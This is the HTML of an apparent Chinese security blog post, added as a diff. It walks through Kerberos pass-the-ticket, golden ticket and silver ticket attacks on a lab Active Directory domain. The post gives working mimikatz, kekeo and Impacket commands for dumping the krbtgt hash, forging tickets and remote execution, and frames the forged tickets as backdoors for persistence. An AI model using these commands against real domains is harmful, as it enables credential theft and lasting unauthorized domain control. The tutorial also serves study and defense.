@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/ad_ptt.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="域渗透-票据传递攻击（Pass the Ticket） - F0rmat&#39;s Blog">
+    <meta property="og:title" content="域渗透-票据传递攻击（Pass the Ticket） - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="域渗透-票据传递攻击（Pass the Ticket） - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 票据传递（Pass the Ticket，PTT），使用 Kerberos票据进行内网横向，不需要管理员权限。比如之前一篇文章： 域渗透-哈希传递">
+    <meta property="og:description" content="0x00 前言 票据传递（Pass the Ticket，PTT），使用 Kerberos票据进行内网横向，不需要管理员权限。比如之前一篇文章： 域渗透-哈希传递">
+    <meta property="twitter:description" content="0x00 前言 票据传递（Pass the Ticket，PTT），使用 Kerberos票据进行内网横向，不需要管理员权限。比如之前一篇文章： 域渗透-哈希传递">
+    <meta property="og:type" content="article">
+    <title>域渗透-票据传递攻击（Pass the Ticket） - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/ad_ptt.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/ad_ptt.html" title="域渗透-票据传递攻击（Pass the Ticket）">域渗透-票据传递攻击（Pass the Ticket）</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-02-28 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 28 Feb 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            3581 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            8 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-简介">0x01 简介</a></li>
+    <li><a href="#0x02-票据传递">0x02 票据传递</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a></li>
+        <li><a href="#实战">实战</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-黄金票据golden-ticket">0x03 黄金票据（Golden Ticket）</a>
+      <ul>
+        <li><a href="#基本原理-1">基本原理</a></li>
+        <li><a href="#实战-1">实战</a>
+          <ul>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#impacket">Impacket</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x04-白银票据silver-ticket">0x04 白银票据（Silver Ticket）</a>
+      <ul>
+        <li><a href="#基本原理-2">基本原理</a></li>
+        <li><a href="#与黄金票据的区别">与黄金票据的区别</a>
+          <ul>
+            <li><a href="#访问权限不同">访问权限不同</a></li>
+            <li><a href="#加密方式不同">加密方式不同</a></li>
+            <li><a href="#认证流程不同">认证流程不同</a></li>
+            <li><a href="#共同点">共同点</a></li>
+          </ul>
+        </li>
+        <li><a href="#利用条件">利用条件</a></li>
+        <li><a href="#实战-2">实战</a>
+          <ul>
+            <li><a href="#伪造cifs服务权限">伪造CIFS服务权限</a></li>
+            <li><a href="#伪造ldap服务权限">伪造LDAP服务权限</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x05-防御">0x05 防御</a></li>
+    <li><a href="#0x06-参考">0x06 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>票据传递（Pass the Ticket，PTT），使用 Kerberos票据进行内网横向，不需要管理员权限。比如之前一篇文章：</p>
+<p><a href="https://xxe.icu/posts/ad_pass_key/">域渗透-哈希传递攻击(Pass the Hash/Key)</a></p>
+<h1 id="0x01-简介">0x01 简介</h1>
+<p>票据传递攻击攻击点都是出现在kerberos认证中的，所以我们我们需要知道的kerberos基本原理，可以查阅另外一篇文章<a href="https://xxe.icu/posts/kerberos_authentication/">域渗透-Kerberos认证</a> 进行学习。</p>
+<p>我们先要了解一些基础的概念：</p>
+<ul>
+<li>KDC（Key Distribution Center）= 密钥分发中心</li>
+<li>AS（Authentication Service）= 认证用户的身份，并为其发放TGT的服务</li>
+<li>TGT（Ticket Granting Ticket）= TGT认证票据，由AS服务发放，存储在内存，默认有效期为10小时</li>
+<li>TGS（Ticket Granting Service）= 票据发放服务</li>
+<li>ST（Service Tickets）= ST服务票据，由TGS服务发送</li>
+<li>AP（Application Server）= 提供用户所需的服务</li>
+<li>黄金票据（Golden Ticket）= 使用域账号krbtgt的NTLM Hash进行加密</li>
+<li>白银票据 （Silver Ticket）= 使用服务账户的NTLM Hash进行加密</li>
+</ul>
+<h1 id="0x02-票据传递">0x02 票据传递</h1>
+<h2 id="基本原理">基本原理</h2>
+<p>票据传递是把内存中的TGT和ST票据进行认证，获取远程服务的访问权限。比如我们拿到一个域用户和域控的NTLM，大家都知道使用PTH（Pass the hash）使用mimikatz都需要本地管理员权限才可以操作（当然也可以用impacket里面的工具），可以使用ptt功能进行票据传递，拿到域控的权限。</p>
+<h2 id="实战">实战</h2>
+<p>环境是：</p>
+<p>172.16.0.105：普通域用户权限，Windows 7</p>
+<p>172.16.0.106：域控服务器,域管理用户testuser</p>
+<p>我们在Windows 7拿到了域管理员testuser的NTLM，但是没有本地管理员的权限。要使用kekeo才可以申请TGT，mimikatz找不到这个功能，但是mimikatz有ptt的功能。</p>
+<p>下面使用<a href="https://github.com/gentilkiwi/kekeo">kekeo</a>进行操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kekeo</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;tgt::ask /user:testuser /domain:hack.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed&#34;</span> <span class="n">exit</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/1.png" alt="1"></p>
+<p>执行后会在当前的目录上生成一个后缀为<code>kirbi</code>的票据文件，我们需要把该票据导入到内存中才可以生效。</p>
+<p>先使用系统自带清理票据的命令，要不然会出现错误：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">klist purge
+</span></span></code></pre></div><p>将票据文件导入内存有两种方法，都是不需要管理员权限</p>
+<p>kekeo：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kekeo</span> <span class="s2">&#34;kerberos::ptt TGT_testuser@HACK.LAB_krbtgt~hack.lab@HACK.LAB.kirbi&#34;</span> <span class="n">exit</span>
+</span></span></code></pre></div><p>Mimikatz:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">lucky</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">TGT_testuser</span><span class="nv">@HACK</span><span class="p">.</span><span class="n">LAB_krbtgt</span><span class="p">~</span><span class="n">hack</span><span class="p">.</span><span class="n">lab</span><span class="nv">@HACK</span><span class="p">.</span><span class="py">LAB</span><span class="p">.</span><span class="py">kirbi</span>
+</span></span></code></pre></div><p>导入后我们再尝试远程访问域控的文件内容：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/2.png" alt="2"></p>
+<p>有同学说都有域控管理员的NTLM了，这不是脱裤子放屁嘛～哈哈哈，重点在票据传递</p>
+<h1 id="0x03-黄金票据golden-ticket">0x03 黄金票据（Golden Ticket）</h1>
+<h2 id="基本原理-1">基本原理</h2>
+<p>之前对黄金票据的理解就是：拿到krbtgt的密码Hash，然后生成任何权限的票据。</p>
+<p>诶？要拿到域管理员权限啊，就是要有域管理员权限才可以拿到krbtgt的Hash，那不就脱裤子放屁嘛？</p>
+<p>黄金票据在域渗透中经常用来做后门，啊这，那没事了～</p>
+<p>黄金票据当你域管理的权限掉了或者密码被改了的时候就很有用。</p>
+<p>还记得<a href="https://xxe.icu/posts/kerberos_authentication/#as_rep">域渗透-Kerberos认证</a>中AS_REP的ticket中enc-part就是使用krbtgt加密后发过来的TGT票据，那么我们拥有了krbtgt的Hash后就可以创建域内任意的用户生成TGT票据，然后那这张票据去访问服务。比如我拿krbtgt的Hash创建域管理administrator的TGT票据，然后我就可以拿这张票据去请求服务，总所周知，域管理权限很大。</p>
+<h2 id="实战-1">实战</h2>
+<p>假如我们现在的环境是：</p>
+<p>172.16.0.105：内网中的一台普通主机，现在有普通域用户lucky登录到上面</p>
+<p>172.16.0.106：域控服务器，名称为DC.hack.lab</p>
+<p>172.16.0.107：Kali Linux</p>
+<h3 id="mimikatz">Mimikatz</h3>
+<p>再假如我们上次拿到了域控的权限，导出krbtgt的票据，使用的工具是mimikatz：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # lsadump::lsa /inject /name:krbtgt
+</span></span></code></pre></div><p>或者</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # lsadump::dcsync /user:krbtgt
+</span></span></code></pre></div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/3.png" alt="3"></p>
+<p>记下NTLM和、域SID，下面会用得上。</p>
+<p>现在目标管理员已经把域控的后门去掉，而且修改了域管理的密码。</p>
+<p>现在就是黄金票据上场的时候了，我们用普通域用户lucky登录到主机172.16.0.105中进行操作。</p>
+<p>有两个方法，一个就是直接在申请票据，一个是生成票据再导入票据。</p>
+<p>我们直接申请票据写入内存：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ptt
+</span></span></code></pre></div><p>然后远程访问DC的C盘：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/4.png" alt="4"></p>
+<p>记得清理下系统票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">klist purge
+</span></span></code></pre></div><p>Mimikatz:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::purge
+</span></span></code></pre></div><p>导出票据再导入内存，我们在后面加ticket即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ticket:fakeuser.kiribi
+</span></span></code></pre></div><p>运行后会在当前目录生成fakeuser.kiribi文件，然后使用ptt导入内存：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # kerberos::ptt fakeuser.kiribi
+</span></span></code></pre></div><blockquote>
+<p>生成Golden Ticket不仅可以使用aes256还可以使用rc4加密的密钥</p>
+</blockquote>
+<h3 id="impacket">Impacket</h3>
+<p>除此之外我们还可以利用impacket进行制作黄金票据，完全在kali上操作,当然这个工具也可以在Windows上使用。</p>
+<p>可能大家在kali上会遇到下面的报错：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[-] [Errno Connection error (HACK.LAB:88)] [Errno -2] Name or service not known
+</span></span></code></pre></div><p>是因为kali的hosts文件和krb5-user包没安装导致的。</p>
+<p>安装krb5的krb5-user包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install krb5-user 
+</span></span></code></pre></div><p>设置/etc/hosts：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/6.png" alt="6"></p>
+<p>设置/etc/krb5.conf：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">default_realm =hack.lab
+</span></span><span class="line"><span class="cl">[realms]
+</span></span><span class="line"><span class="cl">		hack.lab = {
+</span></span><span class="line"><span class="cl">				kdc = tcp/dc:88
+</span></span><span class="line"><span class="cl">		}
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/7.png" alt="7"></p>
+<p>我们先用域管理员账户密码获取到krbtgt的hash，这里使用一个<a href="https://github.com/Secd0g/bat-armor/blob/master/examples/krbtgt.bat">编码版的mimikatz</a>。</p>
+<p>使用psexec.py远程登录到域控执行读取hash：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psexec.py hack.lab/testuser@dc -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&#39;</span> -c krbtgt.bat
+</span></span></code></pre></div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/5.png" alt="5"></p>
+<p>我们拿到krbtgt的hash和域的sid后，再使用Impacket的ticketer.py脚本进行导出黄金票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ticketer.py -nthash 79f9b4b4e9ffced451fb812cac908bb6 -domain-sid S-1-5-21-3896163557-1645138957-2306563325 -domain hack.lab  testuser
+</span></span></code></pre></div><p>它会在目录下生成testuser.ccache文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/8.png" alt="8"></p>
+<p>然后设置一下环境变量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>testuser.ccache
+</span></span></code></pre></div><p>最后执行psexec即可远程访问：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psexec.py hack.lab/testuser@dc -k -no-pass
+</span></span></code></pre></div><blockquote>
+<p>-k 是使用kerberos票据，也就是上面设置的KRB5CCNAME环境变量</p>
+</blockquote>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/9.png" alt="9"></p>
+<blockquote>
+<p>除了psexec以外，还可以使用其他工具例如wmiexec.py（它比psexec.py更加隐蔽，因为它不会上传任何二进制文件并且不启动任何服务）或atexec.py（使用计划的任务执行代码）</p>
+</blockquote>
+<h1 id="0x04-白银票据silver-ticket">0x04 白银票据（Silver Ticket）</h1>
+<h2 id="基本原理-2">基本原理</h2>
+<p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据（service ticket），这个票据也被称为白银票据。</p>
+<p>相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。</p>
+<p>但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDCPAC签名，则银票将不起作用。</p>
+<h2 id="与黄金票据的区别">与黄金票据的区别</h2>
+<h3 id="访问权限不同">访问权限不同</h3>
+<p>Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限</p>
+<p>Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限</p>
+<h3 id="加密方式不同">加密方式不同</h3>
+<p>Golden Ticket是由krbtgt的hash加密</p>
+<p>Silver Ticket是由服务账户（通常为计算机账户）hash加密</p>
+<h3 id="认证流程不同">认证流程不同</h3>
+<p>Golden Ticket在使用的过程需要同域控通信</p>
+<p>Silver Ticket在使用的过程不需要同域控通信</p>
+<h3 id="共同点">共同点</h3>
+<p>都是用来做后门</p>
+<h2 id="利用条件">利用条件</h2>
+<p>攻击者在使用Silver Ticket对内网进行攻击时，需要掌握以下信息：</p>
+<ul>
+<li>域名</li>
+<li>域SID</li>
+<li>目标服务器的FQDN</li>
+<li>可利用的服务</li>
+<li>服务账号的NTLM Hash</li>
+<li>需要伪造的用户名</li>
+</ul>
+<h2 id="实战-2">实战</h2>
+<p>也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。</p>
+<h3 id="伪造cifs服务权限">伪造CIFS服务权限</h3>
+<p>CIFS服务通常用于Windows主机之间的文件共享。</p>
+<p>我们在获取到某一台主机的管理员权限，或者一般情况下我们都在域控上面做白银票据，留作后门。</p>
+<p>现在我们在域控上使用mimikatz获取信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz log &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34;
+</span></span></code></pre></div><blockquote>
+<p>使用log会把执行记录生成在当前目录，方便复制</p>
+</blockquote>
+<p>我们找到以username为主机名称的信息：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/10.png" alt="10"></p>
+<p>获取SID值：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami /all
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/11.png" alt="11"></p>
+<blockquote>
+<p>注意要去掉-500</p>
+</blockquote>
+<p>整理以上获得的信息如下：</p>
+<ul>
+<li>/domain:hack.lab</li>
+<li>/sid:S-1-5-21-3896163557-1645138957-2306563325</li>
+<li>/target:dc.hack.lab</li>
+<li>/service:cifs</li>
+<li>/rc4:b21153e3b2ca87bc4b2031f2a9726613</li>
+<li>/user:fakeuser</li>
+</ul>
+<p>记得清理下系统票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">klist purge
+</span></span></code></pre></div><p>Mimikatz:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::purge
+</span></span></code></pre></div><p>现在来到我们普通域用户下的win7（172.16.0.105）执行mimikatz：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz &#34;kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /target:dc.hack.lab /service:cifs /rc4:b21153e3b2ca87bc4b2031f2a9726613 /user:fakeuser /ptt&#34;
+</span></span></code></pre></div><p>执行完我们就可以访问dc服务器上的文件了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/12.png" alt="12"></p>
+<h3 id="伪造ldap服务权限">伪造LDAP服务权限</h3>
+<p>我们可以使用dcsync从域控服务器中获取指定用户的散列值，比如krbtgt。现在我们使用mimikatz实验获取krbtgt的密码散列：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::dcsync /dc:dc.hack.lab /domain:hack.lab /user:krbtgt
+</span></span></code></pre></div><p>可以看到是无法获取的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/13.png" alt="13"></p>
+<p>记得清理下系统票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">klist purge
+</span></span></code></pre></div><p>Mimikatz:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::purge
+</span></span></code></pre></div><p>现在我们开始使用上面获取到的信息进行伪造银票：</p>
+<ul>
+<li>/domain:hack.lab</li>
+<li>/sid:S-1-5-21-3896163557-1645138957-2306563325</li>
+<li>/target:dc.hack.lab</li>
+<li>/service:ldap</li>
+<li>/rc4:b21153e3b2ca87bc4b2031f2a9726613</li>
+<li>/user:fakeuser</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz &#34;kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /target:dc.hack.lab /service:ldap /rc4:b21153e3b2ca87bc4b2031f2a9726613 /user:fakeuser /ptt&#34;
+</span></span></code></pre></div><p>我们再次获取的时候就能有权限了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/14.png" alt="14"></p>
+<blockquote>
+<p>lsadump::dcsync
+向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
+需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
+只读域控制器默认不允许读取用户密码数据</p>
+</blockquote>
+<h1 id="0x05-防御">0x05 防御</h1>
+<ol>
+<li>在内网中安装杀毒软件，及时更新系统补丁</li>
+<li>安装流量监控设备，时刻关注域控的日志</li>
+<li>计算机账户的账户密码默认30天更换一次</li>
+</ol>
+<h1 id="0x06-参考">0x06 参考</h1>
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets</a></p>
+<p><a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html</a></p>
+<p><a href="https://blog.csdn.net/qq_41874930/article/details/108266378">https://blog.csdn.net/qq_41874930/article/details/108266378</a></p>
+<p><a href="https://www.bianchengquan.com/article/394332.html">https://www.bianchengquan.com/article/394332.html</a></p>
+<p><a href="https://xz.aliyun.com/t/8690">https://xz.aliyun.com/t/8690</a></p>
+<p><a href="https://buaq.net/go-87488.html">https://buaq.net/go-87488.html</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/ad_ptt.html">https://xxe.icu/ad_ptt.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
